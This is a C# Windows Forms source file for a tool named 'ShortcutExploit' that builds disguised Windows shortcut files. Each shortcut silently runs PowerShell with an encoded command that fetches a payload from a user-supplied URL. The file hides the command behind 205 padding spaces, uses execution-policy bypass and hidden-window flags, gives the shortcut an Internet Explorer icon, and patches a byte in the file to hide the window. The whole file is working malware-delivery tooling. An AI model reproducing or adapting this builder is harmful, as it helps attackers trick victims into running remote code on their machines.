using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using IWshRuntimeLibrary;
using ShortcutExploit.Properties;
using TsudaKageyu;
using File = System.IO.File;

namespace ShortcutExploit
{
    public partial class FrmMain : Form
    {
        private int _iconIndex;
        private const string Shell32Path = @"%SystemRoot%\SYSTEM32\shell32.dll";

        public FrmMain()
        {
            InitializeComponent();
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            var icon = Icon.ExtractAssociatedIcon(GetInternetExplorerExecutablePath());
            if (icon != null)
                pcIcon.Image = icon.ToBitmap();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (sfdBuildShortcut.ShowDialog() != DialogResult.OK)
                return;

            WshShellClass wsh = new WshShellClass();
            IWshShortcut shortcut = wsh.CreateShortcut(sfdBuildShortcut.FileName) as IWshShortcut;
            if (shortcut != null)
            {
                try
                {
                    string args = string.Format(Resources.PowerShellCode, tbPayloadURL.Text);

                    shortcut.TargetPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
                    shortcut.Arguments =
                        $"{new string(' ', 205)} -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {Convert.ToBase64String(Encoding.Unicode.GetBytes(args))}";
                    shortcut.Description = tbDescription.Text;
                    shortcut.IconLocation = _iconIndex == 0
                        ? $"{GetInternetExplorerExecutablePath()},1"
                        : $"{Shell32Path},{_iconIndex}";
                    shortcut.Save();

                    // Patch "Run" section of shortcut to hide the window of Powershell.exe
                    var fileBytes = File.ReadAllBytes(sfdBuildShortcut.FileName);
                    fileBytes[60] = 7;
                    File.WriteAllBytes(sfdBuildShortcut.FileName, fileBytes);

                    MessageBox.Show(@"Build success", string.Empty, MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch(Exception ex)
                {
                    MessageBox.Show(ex.Message, string.Empty, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void pcIcon_Click(object sender, EventArgs e)
        {
            var iconPickerDialog = new IconPickerDialog();
            if (iconPickerDialog.ShowDialog(this) == DialogResult.OK)
            {
                _iconIndex = iconPickerDialog.IconIndex;

                var extractor = new IconExtractor(iconPickerDialog.FileName);
                var icon = extractor.GetIcon(iconPickerDialog.IconIndex);

                var splitIcons = IconUtil.Split(icon);
                var maxSizeIcon = splitIcons.Where(f => f.Height == splitIcons.Max(m => m.Height)).ToList();

                if (maxSizeIcon.Any())
                    pcIcon.Image = IconUtil.ToBitmap(maxSizeIcon[maxSizeIcon.Count() - 1]);
            }
        }

        private string GetInternetExplorerExecutablePath()
        {
            string iePath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            return Path.Combine(iePath, @"Internet Explorer\iexplore.exe");
        }
    }
}